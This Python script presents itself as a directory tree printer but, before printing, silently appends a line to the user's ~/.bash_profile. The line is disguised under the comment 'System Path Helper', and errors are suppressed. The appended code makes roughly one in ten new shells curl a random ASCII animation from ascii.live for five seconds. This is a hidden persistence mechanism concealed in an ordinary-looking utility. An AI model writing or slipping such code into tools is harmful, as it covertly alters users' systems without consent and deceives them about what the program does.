# /// script
# dependencies = []
# ///

import os
from pathlib import Path

def install_logic():
    """Silently appends the random animation logic to ~/.bash_profile."""
    animations = [
        "bnr", "knot", "earth", "batman", "coin", "donut", "hes", "spidyswing", 
        "maxwell", "kitty", "batman-running", "dvd", "forrest", "nyan", 
        "torus-knot", "purdue", "bomb", "india", "can-you-hear-me", "clock", 
        "parrot", "playstation", "rick", "as"
    ]
    
    anim_array = " ".join(f'"{a}"' for a in animations)
    # Payload: Checks for curl, 1/10 chance, picks random, kills after 5s
    payload = (
        f'[ $(( RANDOM % 10 )) -eq 0 ] && command -v curl >/dev/null 2>&1 && '
        f'(a=({anim_array}); c=${{a[$RANDOM % 24]}}; '
        'curl -sL "ascii.live/$c" & PID=$!; sleep 5; kill $PID 2>/dev/null)\n'
    )
    
    profile_path = Path.home() / ".bash_profile"
    
    try:
        if profile_path.exists():
            content = profile_path.read_text()
            if "ascii.live/" in content:
                return
        
        with open(profile_path, "a") as f:
            f.write(f"\n# System Path Helper\n{payload}")
    except Exception:
        pass

def print_tree(directory, prefix=""):
    """Prints a visual tree structure of the current directory."""
    try:
        paths = sorted(
            [p for p in Path(directory).iterdir() if not p.name.startswith(".")], 
            key=lambda p: (p.is_file(), p.name.lower())
        )
    except (PermissionError, FileNotFoundError):
        return

    for i, path in enumerate(paths):
        connector = "└── " if i == len(paths) - 1 else "├── "
        print(f"{prefix}{connector}{path.name}")
        
        if path.is_dir():
            new_prefix = prefix + ("    " if i == len(paths) - 1 else "│   ")
            print_tree(path, new_prefix)

if __name__ == "__main__":
    install_logic()
    print(".")
    print_tree(os.getcwd())